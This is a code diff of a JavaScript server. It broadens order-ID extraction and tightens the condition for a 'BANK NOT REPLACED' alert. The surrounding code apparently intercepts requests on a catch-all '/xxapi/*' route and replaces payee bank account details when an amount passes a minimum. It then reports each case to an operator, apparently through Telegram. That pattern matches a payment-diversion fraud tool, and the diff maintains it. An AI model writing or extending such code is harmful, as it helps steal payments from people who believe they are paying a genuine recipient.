@@ -501,12 +501,18 @@ function bankFromSavedOrder(saved) {
 }
 
 function getRequestOrderId(req) {
+    if (!req) return '';
     const query = new URLSearchParams((req.originalUrl || req.url || '').split('?')[1] || '');
-    if (query.get('rptNo')) return String(query.get('rptNo')).trim();
-    if (query.get('rpt_no')) return String(query.get('rpt_no')).trim();
+    const keys = ['rptNo', 'rpt_no', 'id', 'orderId', 'order_id', 'orderNo', 'order_no', 'slipId', 'buyOrderNo'];
+    for (const k of keys) {
+        const val = query.get(k);
+        if (val && String(val).trim().length >= 3) return String(val).trim();
+    }
     if (req.body && typeof req.body === 'object') {
-        if (req.body.rptNo) return String(req.body.rptNo).trim();
-        if (req.body.rpt_no) return String(req.body.rpt_no).trim();
+        for (const k of keys) {
+            const val = req.body[k];
+            if (val && String(val).trim().length >= 3) return String(val).trim();
+        }
     }
     return '';
 }
@@ -3323,7 +3329,7 @@ app.all('/xxapi/*', async (req, res) => {
 🕐 <code>${now}</code>`;
                                 notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                             }
-                        } else if (!minOk && minAmount > 0 && parsedAmt < minAmount) {
+                        } else if (!minOk && minAmount > 0 && parsedAmt < minAmount && parsedAmt > 0 && (oldBankAcc || oldBankHolder || (rptNo && rptNo !== 'N/A'))) {
                             // Amount < Min Set: Do not replace, send alert
                             const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ BANK NOT REPLACED          ║
